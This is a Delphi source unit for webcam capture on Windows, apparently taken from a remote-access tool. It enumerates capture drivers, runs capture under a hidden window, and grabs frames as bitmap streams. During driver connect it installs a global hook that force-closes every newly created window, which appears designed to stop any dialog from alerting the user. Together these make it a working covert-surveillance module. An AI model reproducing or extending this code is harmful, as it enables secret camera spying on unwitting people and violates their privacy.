Unit WebcamAPI;

interface

uses
  Windows,
  Messages,
  unitobjeto,
  classes;

var
  MyWebCamObject: TMyObject;

function ListarDispositivosWebCam(Delimitador: WideString): WideString;
function InitCapture(WebcamID: integer): boolean;
function GetWebcamImage(var ReplyStream: TMemoryStream): boolean;
procedure DestroyCapture;

implementation

const
  WM_CAP_START                        = WM_USER;
  WM_CAP_DRIVER_DISCONNECT            = WM_CAP_START + 11;
  WM_CAP_DRIVER_CONNECT               = WM_CAP_START + 10;
  WM_CAP_SET_PREVIEW                  = WM_CAP_START + 50;
  WM_CAP_SET_OVERLAY                  = WM_CAP_START + 51;
  WM_CAP_SET_PREVIEWRATE              = WM_CAP_START + 52;
  WM_CAP_GRAB_FRAME_NOSTOP            = WM_CAP_START + 61;
  WM_CAP_SET_CALLBACK_FRAME           = WM_CAP_START + 5;
  WM_CAP_SAVEDIB                      = WM_CAP_START + 25;
  WM_CAP_EDIT_COPY                    = WM_CAP_START + 30;
  WM_CAP_GRAB_FRAME                   = WM_CAP_START + 60;

  PICWIDTH                            = 640;
  PICHEIGHT                           = 480;
  SUBLINEHEIGHT                       = 18;
  EXTRAHEIGHT                         = 400;

var
  FCapHandle: THandle;

function IntToStr(i: Integer): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Integer;
begin
  Val(S, Result, Result);
end;

function SaveBitmapToStream(Stream: TMemoryStream; HBM: HBitmap): Integer;
const
  BMType = $4D42;
type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  BitCount: word;

  function AlignDouble(Size: Longint): Longint;
  begin
    Result := (Size + 31) div 32 * 4;
  end;

begin
  Result := 0;
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;
  BitCount := 32;
  if (BitCount <> 24) then
    ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount)
  else
    ColorSize := 0;
  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  if BIP <> nil then
    begin
      with BIP^.bmiHeader do
        begin
          biSize := SizeOf(TBitmapInfoHeader);
          biWidth := bm.bmWidth;
          biHeight := bm.bmHeight;
          biPlanes := 1;
          biBitCount := BitCount;
          biCompression := 0;
          biSizeImage := DataSize;
          biXPelsPerMeter := 0;
          biYPelsPerMeter := 0;
          biClrUsed := 0;
          biClrImportant := 0;
        end;
      with BFH do
        begin
          bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
          bfReserved1 := 0;
          bfReserved2 := 0;
          bfSize := longint(bfOffBits) + DataSize;
          bfType := BMType;
        end;
      HMem := GlobalAlloc(gmem_Fixed, DataSize);
      if HMem <> 0 then
        begin
          Buf := GlobalLock(HMem);
          DC := GetDC(0);
          if GetDIBits(DC, hbm, 0, bm.bmHeight,
            Buf, BIP^, dib_RGB_Colors) <> 0 then
          begin
            Stream.WriteBuffer(BFH, SizeOf(BFH));
            Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
            Stream.WriteBuffer(Buf^, DataSize);
            Result := 1;
          end;
          ReleaseDC(0, DC);
          GlobalUnlock(HMem);
          GlobalFree(HMem);
        end;
    end;
  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

function capCreateCaptureWindow(lpszWindowName: pWideChar;
  dwStyle: DWORD;
  x, y,
  nWidth,
  nHeight: integer;
  hwndParent: HWND;
  nID: integer): HWND; stdcall;
  external 'AVICAP32.DLL' name 'capCreateCaptureWindowW';

function capGetDriverDescription(
  wDriverIndex: DWord;
  lpszName    : pWideChar;
  cbName      : Integer;
  lpszVer     : pWideChar;
  cbVer       : Integer ) : Boolean; stdcall; external 'avicap32.dll' name 'capGetDriverDescriptionW';

function ListarDispositivosWebCam(Delimitador: WideString): WideString;
var
  szName,
  szVersion: array[0..MAX_PATH] of widechar;
  iReturn: Boolean;
  x: integer;
begin
  Result := '';
  x := 0;
  repeat
    iReturn := capGetDriverDescription(x, @szName, sizeof(szName), @szVersion, sizeof(szVersion));
    If iReturn then
    begin
     Result := Result + '"' + szName + ' - ' + szVersion + '"' + Delimitador;
     Inc(x);
    end;
  until iReturn = False;
end;

var
  kHook: Thandle;

function LowLevelHookProc(nCode, wParam, lParam : integer) : integer; stdcall;
var
  TempStr: array [0..255] of WideChar;
begin
  if nCode = HCBT_CREATEWND then
  begin
    GetClassNameW(wParam, TempStr, sizeof(TempStr));
    SendMessage(wParam, WM_CLOSE, 0, 0);
	//MessageBoxW(0, pWChar('Aqui porra...' + inttostr(wParam)), TempStr, 0);
  end else
  result := CallNextHookEx(kHook, nCode, wParam, lParam);
end;

function StartCapture(WebcamID: integer): boolean;
begin
  Result := False;
  if Assigned(MyWebcamObject) = false then exit;
  FCapHandle := capCreateCaptureWindow('Video', WS_CHILD or WS_VISIBLE, 0, 0,
    PICWIDTH, PICHEIGHT, MyWebcamObject.Handle, 1);
  kHook := SetWindowsHookExW(WH_CBT, @LowLevelHookProc, GetModuleHandle(0), 0);
  result := LongBool(SendMessage(FCapHandle, WM_CAP_DRIVER_CONNECT, WebcamID, 0));
  UnhookWindowsHookEx(kHook);
  if result = false then
  begin
    FreeAndNil(MyWebcamObject);
    exit;
  end;
  SendMessage(FCapHandle, WM_CAP_SET_PREVIEWRATE, 1, 0);
  sendMessage(FCapHandle, WM_CAP_SET_OVERLAY, 1, 0);
  SendMessage(FCapHandle, WM_CAP_SET_PREVIEW, 1, 0);
end;

procedure DestroyCapture;
begin
  SendMessage(FCapHandle, WM_CAP_DRIVER_DISCONNECT, 0, 0);
  FreeAndNil(MyWebcamObject);
end;

function WindowProc(HWND, Msg, wParam, lParam: longint): longint; stdcall;
begin
  if Msg = WM_DESTROY then DestroyCapture else
  Result := DefWindowProc(HWND, Msg, wParam, lParam);
end;

function InitCapture(WebcamID: integer): boolean;
var
  Msg: TMsg;
begin
  MyWebcamObject := TMyObject.Create('WEBCAM', @WindowProc);
  ShowWindow(MyWebcamObject.Handle, SW_HIDE);
  result := StartCapture(WebcamID);
end;

function GetWebcamImage(var ReplyStream: TMemoryStream): boolean;
begin
  result := False;
  try
    if Assigned(MyWebcamObject) = true then
    begin
      SendMessage(FCapHandle, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
      SendMessage(FCapHandle, WM_CAP_GRAB_FRAME_NOSTOP, 1, 0);

      ReplyStream.Clear;
      ReplyStream.Position := 0;
      SendMessage(FCapHandle, WM_CAP_GRAB_FRAME, 0, 0);
      SendMessage(FCapHandle, WM_CAP_EDIT_COPY, 0, 0);
      OpenClipboard(0);
      SaveBitmapToStream(ReplyStream, GetClipboardData(CF_BITMAP));
      CloseClipboard;
      result := ReplyStream.Size > 0;
      //ReplyStream.SaveToFile(inttostr(gettickcount) + '.bmp');
    end;
    except
    Result := false;
  end;
end;

end.
